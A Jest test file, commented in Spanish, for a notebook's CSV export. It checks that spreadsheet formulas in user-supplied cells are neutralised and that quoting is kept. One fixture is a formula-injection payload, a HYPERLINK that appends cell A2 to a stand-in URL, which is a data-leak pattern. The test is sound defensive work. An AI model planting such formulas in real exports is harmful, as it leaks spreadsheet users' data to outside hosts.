import { toCsv } from './notebook-export';

/**
 * El CSV del cuaderno lleva glosas y filas de clientes: texto que escribe un tercero y que se
 * abre en Excel. Una celda que empiece por `=`, `+`, `-` o `@` no puede llegar ejecutable.
 */
describe('toCsv del cuaderno', () => {
  it('neutraliza las fórmulas como el resto de exportaciones del portal', () => {
    const csv = toCsv({
      columns: ['glosa', 'monto'],
      rows: [
        { glosa: '=HYPERLINK("https://x/?"&A2,"ver")', monto: 10 },
        { glosa: '@SUMA(A1)', monto: -5 },
      ],
    });
    const [, primera, segunda] = csv.split('\r\n');
    expect(primera).toBe(`"'=HYPERLINK(""https://x/?""&A2,""ver"")",10`);
    // El número negativo sigue siendo un número: la hoja lo tiene que poder sumar.
    expect(segunda).toBe("'@SUMA(A1),-5");
  });

  it('conserva el entrecomillado de comas y saltos de línea', () => {
    expect(toCsv({ columns: ['a'], rows: [{ a: 'x,\ry' }] })).toBe('a\r\n"x,\ry"');
  });
});
